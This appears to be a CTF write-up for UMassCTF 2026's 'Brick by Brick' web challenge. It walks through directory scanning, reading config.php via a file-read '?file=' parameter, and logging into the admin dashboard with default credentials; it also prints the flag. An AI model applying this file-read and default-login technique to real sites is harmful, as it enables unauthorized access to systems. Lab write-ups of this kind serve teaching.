---
title: "UMassCTF2026-Brick by Brick"
description: "CTF writeup - Brick by Brick (UMassCTF 2026)"
date: 2026-04-12
tags: [CTF, Web, UMassCTF]
category: "UMassCTF 2026"
cover: ./cover.png
pinned: false
draft: false
---

### Challenge description

The challenge homepage only displays a maintenance notice:

> “Internal systems are currently undergoing maintenance.”

### Directory scanning and finding `robots.txt`

Use `dirsearch`:

![](./image.png)

From here we learn there is a hidden directory:

![](./image-1.png)

---

### Opening the internal files

Access the files one by one.

The notable content in `/internal-docs/it-onboarding.txt`:

```text
SECTION 1 - DOCUMENT PORTAL

The internal document portal lives at our main intranet address.
Staff can access any file using the ?file= parameter:

SECTION 2 - ADMIN DASHBOARD

Credentials are stored in the application config file
for reference by the IT team. See config.php in the web root.
```

From here we get 2 very important pieces of information:

1. The website has a file-reading feature via the `?file=` parameter

2. The admin login info is in `config.php`

Access `/?file=config.php`:

```php
<?php
// BrickWorks Co. - Application Configuration
// WARNING: Do not expose this file publicly!

// The admin dashboard is located at /dashboard-admin.php.

// Database
define('DB_HOST', 'localhost');
define('DB_NAME', 'brickworks');
define('DB_USER', 'brickworks_app');
define('DB_PASS', 'Br1ckW0rks_db_2024!');

// WARNING: SYSTEM IS CURRENTLY USING DEFAULT FACTORY CREDENTIALS.
// TODO: Change 'administrator' account from default password.

define('ADMIN_USER', 'administrator');
define('ADMIN_PASS', '[deleted it for safety reasons - Tom]');

// App settings
define('APP_ENV', 'production');
define('APP_DEBUG', false);
define('APP_VERSION', '1.0.3');
```

We obtain:

- the admin dashboard path:

```text
/dashboard-admin.php
```

- the admin username:

```text
administrator
```

- the real password has been removed:

```php
define('ADMIN_PASS', '[deleted it for safety reasons - Tom]');
```

- and a very important comment:

```php
// WARNING: SYSTEM IS CURRENTLY USING DEFAULT FACTORY CREDENTIALS.
// TODO: Change 'administrator' account from default password.
```

This line tells us the system is still using the default password

```text
administrator
```

Access `/dashboard-admin.php`:

![](./image-2.png)

![](./image-3.png)

### Flag

```text
UMASS{4lw4ys_ch4ng3_d3f4ult_cr3d3nt14ls}
```
